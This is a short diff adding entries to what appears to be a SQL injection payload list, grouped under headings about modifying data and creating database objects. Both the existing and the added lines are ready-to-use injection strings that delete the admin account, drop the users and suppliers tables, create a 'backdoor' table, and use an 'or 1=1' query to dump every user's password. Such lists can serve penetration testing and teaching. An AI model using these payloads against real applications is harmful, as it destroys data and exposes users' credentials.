@@ -34,6 +34,11 @@ Modify or delete data
 '; DELETE FROM users WHERE username='admin';--
 '; DROP TABLE users;--
 
+TRY DROP TABLE 
+105; DROP TABLE Suppliers
+TRY GET PASSWORD
+SELECT UserId, Name, Password FROM Users WHERE UserId = 105 or 1=1;
+
 Create or modify database objects
 '; CREATE TABLE backdoor(id INT PRIMARY KEY, secret VARCHAR(100));--
 
